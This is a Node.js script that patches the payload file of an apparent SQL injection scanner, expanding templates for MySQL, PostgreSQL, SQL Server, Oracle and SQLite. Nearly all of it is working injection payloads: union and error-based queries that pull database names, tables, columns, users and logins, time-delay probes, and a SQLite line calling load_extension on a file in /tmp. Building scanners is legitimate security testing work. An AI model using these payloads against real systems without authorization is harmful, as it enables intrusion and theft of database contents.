// Expand payloads.js: PostgreSQL, SQL Server, Oracle, SQLite
// MySQL union already expanded via patch-mysql-union.mjs
import { readFileSync, writeFileSync } from 'fs';
import { execSync } from 'child_process';

const path = 'D:/projects/sqli-scanner/server/src/engine/payloads.js';
let src = readFileSync(path, 'utf8');

function replaceExact(oldText, newText) {
  const oldCRLF = oldText.replace(/\n/g, '\r\n');
  const oldLF = oldText.replace(/\r\n/g, '\n');
  if (src.includes(oldCRLF)) {
    src = src.replace(oldCRLF, newText.replace(/\n/g, '\r\n'));
    return true;
  }
  if (src.includes(oldLF)) {
    src = src.replace(oldLF, newText.replace(/\n/g, '\r\n'));
    return true;
  }
  return false;
}

// ========================================================================
// 1. MySQL stacked (3 -> 6)
// ========================================================================
const oldMyStack = `    stacked: [
      "{ORIG}; SLEEP({SLEEP}) {SEP}",
      "{ORIG}'; SLEEP({SLEEP}) {SEP}",
      '{ORIG}"; SLEEP({SLEEP}) {SEP}',
    ],
  },
  PostgreSQL: {`;

const newMyStack = `    stacked: [
      "{ORIG}; SLEEP({SLEEP}) {SEP}",
      "{ORIG}'; SLEEP({SLEEP}) {SEP}",
      '{ORIG}"; SLEEP({SLEEP}) {SEP}',
      "{ORIG}); SELECT SLEEP({SLEEP}) {SEP}",
      "{ORIG}') ; SELECT SLEEP({SLEEP}) {SEP}",
      "{ORIG}';SELECT SLEEP({SLEEP}) {SEP}",
    ],
  },
  PostgreSQL: {`;

if (!replaceExact(oldMyStack, newMyStack)) { console.log('ERROR: MySQL stacked not found'); process.exit(1); }
console.log('✓ MySQL stacked (3→6)');

// ========================================================================
// 2. PostgreSQL union (3 -> 11)
// ========================================================================
const oldPgUnion = `    union: [
      "{ORIG} UNION SELECT {NUM},version(),current_user-- -",
      "{ORIG}' UNION SELECT {NUM},version(),current_user-- -",
      '{ORIG}" UNION SELECT {NUM},version(),current_user-- -',
    ],
    error: [`;

const newPgUnion = `    union: [
      "{ORIG} UNION SELECT {NUM},version(),current_user-- -",
      "{ORIG}' UNION SELECT {NUM},version(),current_user-- -",
      '{ORIG}" UNION SELECT {NUM},version(),current_user-- -',
      "{ORIG}) UNION SELECT {NUM},version(),current_user-- -",
      "{ORIG}') UNION SELECT {NUM},version(),current_user-- -",
      "{ORIG} UNION ALL SELECT {NUM},version(),current_user-- -",
      "{ORIG}' UNION ALL SELECT {NUM},version(),current_user-- -",
      "{ORIG} UNION SELECT {NUM},current_database(),version()-- -",
      "{ORIG}' UNION SELECT {NUM},(SELECT datname FROM pg_database WHERE datistemplate=false LIMIT 1),1-- -",
      "{ORIG}' UNION SELECT {NUM},(SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1),1-- -",
      "{ORIG}' UNION SELECT {NUM},(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1-- -",
    ],
    error: [`;

if (!replaceExact(oldPgUnion, newPgUnion)) { console.log('ERROR: PG union not found'); process.exit(1); }
console.log('✓ PostgreSQL union (3→11)');

// ========================================================================
// 3. PostgreSQL error (4 -> 14)
// ========================================================================
const oldPgError = `    error: [
      "{ORIG}' AND CAST((SELECT version()) AS int)-- -",
      '{ORIG}" AND CAST((SELECT version()) AS int)-- -',
      "{ORIG}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -",
      "{ORIG} AND CAST((SELECT version()) AS int)-- -",
    ],
    boolean: [`;

const newPgError = `    error: [
      "{ORIG}' AND CAST((SELECT version()) AS int)-- -",
      '{ORIG}" AND CAST((SELECT version()) AS int)-- -',
      "{ORIG}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -",
      "{ORIG} AND CAST((SELECT version()) AS int)-- -",
      "{ORIG}') AND CAST((SELECT current_user) AS int)-- -",
      "{ORIG}' AND 1=CAST((SELECT current_database()) AS int)-- -",
      // 重叠函数报错（PostgreSQL 特有）
      "{ORIG}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT current_database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -",
      "{ORIG}' AND 1=CAST((SELECT current_schema) AS int)-- -",
      "{ORIG}' AND 1=CAST((SELECT usename FROM pg_user WHERE usesysid=10) AS int)-- -",
      "{ORIG}' AND 1=CAST((SELECT datname FROM pg_database) AS int)-- -",
      "{ORIG}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -",
      "{ORIG}' AND 1=CAST((SELECT version()) AS bigint)-- -",
      // 更多 PG 报错变体（对标 sqlmap 覆盖）
      "{ORIG}' AND 1=CAST((SELECT current_query) AS int)-- -",
      "{ORIG}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT current_schema),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -",
    ],
    boolean: [`;

if (!replaceExact(oldPgError, newPgError)) { console.log('ERROR: PG error not found'); process.exit(1); }
console.log('✓ PostgreSQL error (4→14)');

// ========================================================================
// 4. PostgreSQL stacked (3 -> 6)
// ========================================================================
const oldPgStack = `    stacked: [
      "{ORIG}; SELECT pg_sleep({SLEEP}) {SEP}",
      "{ORIG}'; SELECT pg_sleep({SLEEP}) {SEP}",
      '{ORIG}"; SELECT pg_sleep({SLEEP}) {SEP}',
    ],
  },
  "SQL Server": {`;

const newPgStack = `    stacked: [
      "{ORIG}; SELECT pg_sleep({SLEEP}) {SEP}",
      "{ORIG}'; SELECT pg_sleep({SLEEP}) {SEP}",
      '{ORIG}"; SELECT pg_sleep({SLEEP}) {SEP}',
      "{ORIG}); SELECT pg_sleep({SLEEP}) {SEP}",
      "{ORIG}') ;SELECT pg_sleep({SLEEP}) {SEP}",
      "{ORIG}'; select pg_sleep({SLEEP}) {SEP}",
    ],
  },
  "SQL Server": {`;

if (!replaceExact(oldPgStack, newPgStack)) { console.log('ERROR: PG stacked not found'); process.exit(1); }
console.log('✓ PostgreSQL stacked (3→6)');

// ========================================================================
// 5. SQL Server (union 3->10, error 3->10, time 4->7, stacked 3->6)
// ========================================================================
const oldSs = `"SQL Server": {
    union: [
      "{ORIG} UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -",
      "{ORIG}' UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -",
      '{ORIG}" UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -',
    ],
    error: [
      "{ORIG}' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
      '{ORIG}" AND 1=CONVERT(int,(SELECT DB_NAME()))-- -',
      "{ORIG}' AND 1=CAST((SELECT DB_NAME()) AS int)-- -",
    ],
    boolean: [
      "{ORIG}' AND '1'='1",
      '{ORIG}" AND "1"="1',
      "{ORIG}' AND '1'='2",
      '{ORIG}" AND "1"="2',
      "{ORIG} AND 1=1",
      "{ORIG} AND 1=2",
      // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
      "{ORIG}' OR '1'='1",
      "{ORIG}' OR '1'='2",
    ],
    time: [
      "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}'-- -",
      '{ORIG}"; WAITFOR DELAY "0:0:{SLEEP}"-- -',
      "{ORIG}' WAITFOR DELAY '0:0:{SLEEP}'-- -",
      "{ORIG} WAITFOR DELAY '0:0:{SLEEP}'-- -",
    ],
    // 堆叠注入：以 \`;\` 追加独立的 WAITFOR DELAY 延迟语句
    stacked: [
      "{ORIG}; WAITFOR DELAY '0:0:{SLEEP}' {SEP}",
      "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}' {SEP}",
      '{ORIG}"; WAITFOR DELAY "0:0:{SLEEP}" {SEP}',
    ],
  },
  SQLite: {`;

const newSs = `"SQL Server": {
    union: [
      "{ORIG} UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -",
      "{ORIG}' UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -",
      '{ORIG}" UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -',
      "{ORIG}) UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -",
      "{ORIG}') UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -",
      "{ORIG} UNION ALL SELECT {NUM},DB_NAME(),SYSTEM_USER-- -",
      "{ORIG}' UNION SELECT {NUM},@@VERSION,USER_NAME()-- -",
      "{ORIG}' UNION SELECT {NUM},DB_NAME(),@@SERVERNAME-- -",
      "{ORIG}' UNION SELECT {NUM},(SELECT name FROM sys.databases WHERE database_id=DB_ID()),1-- -",
      "{ORIG}' UNION SELECT {NUM},(SELECT name FROM sys.syslogins WHERE name NOT IN ('sa') AND name != SYSTEM_USER),1-- -",
    ],
    error: [
      "{ORIG}' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
      '{ORIG}" AND 1=CONVERT(int,(SELECT DB_NAME()))-- -',
      "{ORIG}' AND 1=CAST((SELECT DB_NAME()) AS int)-- -",
      "{ORIG}' AND 1=CONVERT(int,(SELECT @@VERSION))-- -",
      "{ORIG}' AND 1=CAST((SELECT DB_NAME()) AS bigint)-- -",
      "{ORIG}' AND (SELECT (SELECT DB_NAME() FOR XML PATH(''))).value('a','int')-- -",
      "{ORIG}') AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
      "{ORIG}' AND 1=CONVERT(int,(SELECT name FROM sys.syslogins WHERE name=SYSTEM_USER))-- -",
      "{ORIG}' AND 1=CONVERT(int,(SELECT name FROM sys.databases WHERE database_id=DB_ID()))-- -",
      "{ORIG}' AND (SELECT (SELECT SYSTEM_USER FOR XML PATH(''))).value('a','int')-- -",
    ],
    boolean: [
      "{ORIG}' AND '1'='1",
      '{ORIG}" AND "1"="1',
      "{ORIG}' AND '1'='2",
      '{ORIG}" AND "1"="2',
      "{ORIG} AND 1=1",
      "{ORIG} AND 1=2",
      // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
      "{ORIG}' OR '1'='1",
      "{ORIG}' OR '1'='2",
    ],
    time: [
      "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}'-- -",
      '{ORIG}"; WAITFOR DELAY "0:0:{SLEEP}"-- -',
      "{ORIG}' WAITFOR DELAY '0:0:{SLEEP}'-- -",
      "{ORIG} WAITFOR DELAY '0:0:{SLEEP}'-- -",
      "{ORIG}' WAITFOR DELAY '0:0:{SLEEP}'-- -",
      "{ORIG}'); WAITFOR DELAY '0:0:{SLEEP}'-- -",
      "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}'-- -",
    ],
    // 堆叠注入：以 \`;\` 追加独立的 WAITFOR DELAY 延迟语句
    stacked: [
      "{ORIG}; WAITFOR DELAY '0:0:{SLEEP}' {SEP}",
      "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}' {SEP}",
      '{ORIG}"; WAITFOR DELAY "0:0:{SLEEP}" {SEP}',
      "{ORIG}); WAITFOR DELAY '0:0:{SLEEP}' {SEP}",
      "{ORIG}') ;WAITFOR DELAY '0:0:{SLEEP}' {SEP}",
      "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}' {SEP}",
    ],
  },
  SQLite: {`;

if (!replaceExact(oldSs, newSs)) { console.log('ERROR: SQL Server block not found'); process.exit(1); }
console.log('✓ SQL Server (union 3→10, error 3→10, time 4→7, stacked 3→6)');

// ========================================================================
// 6. Oracle (union 3->13, error 3->12, time 4->8)
// ========================================================================
const oldOr = `Oracle: {
    union: [
      "{ORIG} UNION SELECT {NUM},banner,NULL FROM v$version-- -",
      "{ORIG}' UNION SELECT {NUM},banner,NULL FROM v$version-- -",
      '{ORIG}" UNION SELECT {NUM},banner,NULL FROM v$version-- -',
    ],
    error: [
      "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
      '{ORIG}" AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -',
      "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
    ],
    boolean: [
      "{ORIG}' AND '1'='1",
      '{ORIG}" AND "1"="1',
      "{ORIG}' AND '1'='2",
      '{ORIG}" AND "1"="2',
      "{ORIG} AND 1=1",
      "{ORIG} AND 1=2",
      // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
      "{ORIG}' OR '1'='1",
      "{ORIG}' OR '1'='2",
    ],
    time: [
      // Oracle 无原生 SLEEP；用 DBMS_PIPE.RECEIVE_MESSAGE 挂起指定秒数（无需特权，近似延迟）
      "{ORIG}' AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -",
      // 备选：DBMS_LOCK.SLEEP（更语义化，但需 LOCK 权限，部分环境受限）
      "{ORIG}' AND (SELECT DBMS_LOCK.SLEEP({SLEEP}) FROM dual) IS NULL-- -",
      "{ORIG}' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP}) FROM dual)=0-- -",
      "{ORIG} AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -",
    ],
    // Oracle 标准驱动不支持堆叠查询，预留空模板（检测器对该库直接返回未命中，不投放）
    st`;

const newOr = `Oracle: {
    union: [
      "{ORIG} UNION SELECT {NUM},banner,NULL FROM v$version-- -",
      "{ORIG}' UNION SELECT {NUM},banner,NULL FROM v$version-- -",
      '{ORIG}" UNION SELECT {NUM},banner,NULL FROM v$version-- -',
      "{ORIG}) UNION SELECT {NUM},banner,NULL FROM v$version-- -",
      "{ORIG}') UNION SELECT {NUM},banner,NULL FROM v$version-- -",
      "{ORIG} UNION ALL SELECT {NUM},banner,NULL FROM v$version-- -",
      "{ORIG}' UNION ALL SELECT {NUM},banner,NULL FROM v$version-- -",
      "{ORIG} UNION SELECT {NUM},user,instance_name FROM v$instance-- -",
      "{ORIG}' UNION SELECT {NUM},(SELECT table_name FROM user_tables WHERE ROWNUM=1),NULL FROM dual-- -",
      "{ORIG}' UNION SELECT {NUM},(SELECT column_name FROM user_tab_cols WHERE ROWNUM=1),NULL FROM dual-- -",
      "{ORIG}' UNION SELECT {NUM},(SELECT username FROM all_users WHERE ROWNUM=1),NULL FROM dual-- -",
      "{ORIG}' UNION SELECT {NUM},(SELECT global_name FROM global_name),NULL FROM dual-- -",
      "{ORIG}' UNION SELECT {NUM},(SELECT name FROM v$database),NULL FROM dual-- -",
    ],
    error: [
      "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
      '{ORIG}" AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -',
      "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
      "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -",
      '{ORIG}" AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -',
      "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))-- -",
      "{ORIG}') AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
      "{ORIG}' AND 1=XMLTYPE('<?xml version=\"1.0\"?><a>'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'</a>').getDocumentVal()-- -",
      "{ORIG}' AND 1=XMLTYPE('<?xml version=\"1.0\"?><a>'||(SELECT user FROM dual)||'</a>').getDocumentVal()-- -",
      "{ORIG}' AND 1=XMLTYPE('<?xml version=\"1.0\"?><a>'||(SELECT table_name FROM user_tables WHERE ROWNUM=1)||'</a>').getDocumentVal()-- -",
      "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT table_name FROM user_tables WHERE ROWNUM=1))-- -",
      "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM user_tables WHERE ROWNUM=1))-- -",
    ],
    boolean: [
      "{ORIG}' AND '1'='1",
      '{ORIG}" AND "1"="1',
      "{ORIG}' AND '1'='2",
      '{ORIG}" AND "1"="2',
      "{ORIG} AND 1=1",
      "{ORIG} AND 1=2",
      // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
      "{ORIG}' OR '1'='1",
      "{ORIG}' OR '1'='2",
    ],
    time: [
      // Oracle 无原生 SLEEP；用 DBMS_PIPE.RECEIVE_MESSAGE 挂起指定秒数（无需特权，近似延迟）
      "{ORIG}' AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -",
      // 备选：DBMS_LOCK.SLEEP（更语义化，但需 LOCK 权限，部分环境受限）
      "{ORIG}' AND (SELECT DBMS_LOCK.SLEEP({SLEEP}) FROM dual) IS NULL-- -",
      "{ORIG}' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP}) FROM dual)=0-- -",
      "{ORIG} AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -",
      "{ORIG}') AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -",
      "{ORIG}' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP}) FROM DUAL)=0-- -",
      "{ORIG} AND (SELECT DBMS_LOCK.SLEEP({SLEEP}) FROM dual) IS NULL-- -",
      "{ORIG}' AND (SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM=1 AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0)-- -",
    ],
    // Oracle 标准驱动不支持堆叠查询，预留空模板（检测器对该库直接返回未命中，不投放）
    st`;

if (!replaceExact(oldOr, newOr)) { console.log('ERROR: Oracle block not found'); process.exit(1); }
console.log('✓ Oracle (union 3→13, error 3→12, time 4→8)');

// ========================================================================
// 7. SQLite stacked (2 -> 5)
// ========================================================================
const oldSqSt = `    stacked: [
      "{ORIG}; SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}",
      "{ORIG}'; SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}",
    ],
  },
  Oracle: {`;

const newSqSt = `    stacked: [
      "{ORIG}; SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}",
      "{ORIG}'; SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}",
      "{ORIG}); SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}",
      "{ORIG}') ; SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}",
      "{ORIG}; SELECT load_extension('/tmp/x') {SEP}",
    ],
  },
  Oracle: {`;

if (!replaceExact(oldSqSt, newSqSt)) { console.log('ERROR: SQLite stacked not found'); process.exit(1); }
console.log('✓ SQLite stacked (2→5)');

// ========================================================================
// 8. MySQL error (4 -> 14)
// ========================================================================
const oldMyErr = `    error: [
      "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
      '{ORIG}" AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -',
      "{ORIG}' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
      "{ORIG} AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
    ],
    boolean: [`;

const newMyErr = `    error: [
      "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
      '{ORIG}" AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -',
      "{ORIG}' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
      "{ORIG} AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
      "{ORIG}') AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
      "{ORIG}' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -",
      "{ORIG}' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -",
      "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -",
      "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -",
      "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT @@datadir)))-- -",
      "{ORIG}' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)),1)-- -",
      "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name=(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1) LIMIT 1)))-- -",
      "{ORIG}' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
      "{ORIG}' AND GTID_SUBSET(CONCAT((SELECT version())),1)-- -",
    ],
    boolean: [`;

if (!replaceExact(oldMyErr, newMyErr)) { console.log('ERROR: MySQL error not found'); process.exit(1); }
console.log('✓ MySQL error (4→14)');

// ========================================================================
// Write & verify
// ========================================================================
writeFileSync(path, src, 'utf8');
try {
  execSync(`node -c "${path}"`, { encoding: 'utf8', stdio: 'pipe' });
  console.log('✅ Syntax verification passed!');
} catch (e) {
  console.log('ERROR: Syntax error');
  process.exit(1);
}